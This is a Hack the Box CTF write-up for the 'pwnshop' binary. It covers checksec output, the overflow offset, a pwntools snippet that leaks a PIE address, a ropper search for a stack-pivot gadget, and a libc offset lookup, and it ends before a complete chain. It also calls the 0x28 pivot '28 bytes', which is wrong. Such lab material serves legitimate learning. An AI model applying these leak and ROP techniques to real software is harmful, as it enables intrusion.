Hack the Box - pwnshop



file pwnshop    
pwnshop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e354418962cffebad74fa44061f8c58d92c0e706, for GNU/Linux 3.2.0, stripped

$ checksec --file pwnshop     
[*] '/home/kali/CTF/HTB/pwnshop/pwnshop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled


pwndbg> cyclic -l jaaaaaaa
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72

Within the 'buy function', we see a buffer which we can overflow, providing us with 8 bytes of space to write another address to jump to.  The buffer is 72 bytes, but the 'read' function allows us to read in 80 bytes.

Within the 'sell function', we see that a variable is set to an address in the .bss space, which we can then use to figure out the offset to the piebase and thus know the base address of the program.

*** Leaking that base address:
# # Start program
io = start()

io.sendlineafter('> ', '2')
io.sendlineafter('What do you wish to sell?', 'COCHINO')
io.sendlineafter('How much do you want for it?', 'A' * 7 )
io.recvuntil('A\n')

leaked_addr = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked_addr: %#x", leaked_addr)
print(io.recv())
*****

This address we've leaked is = to the piebase + the offset of the variable ( &DAT_001040c0)

Now we need to figure out how to pivot around the space we have to chain ROP gadgets together

ropper -f pwnshop --console   
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
(pwnshop/ELF/x86_64)> help

(pwnshop/ELF/x86_64)> stack_pivot
0x0000000000001072: ret 0x2f;

ropper -f pwnshop --search "sub"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: sub

[INFO] File: pwnshop

0x0000000000001219: sub rsp, 0x28; ret; 

This ROP gadget (sub rsp, 0x28; ret;) will allow us to back up 28 bytes from wherever we place this gadget.
So if we use this gadget in they 'buy' function (the buffer in which has 72 bytes), this rop gadget will provide us with room to chain 28 bytes worth of ROP gadgets before we overflow the buffer.

Look inside the libc on our system to find the offset for puts:
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts  
   230: 0000000000077820   405 FUNC    WEAK   DEFAULT   16 puts@@GLIBC_2.2.5

   


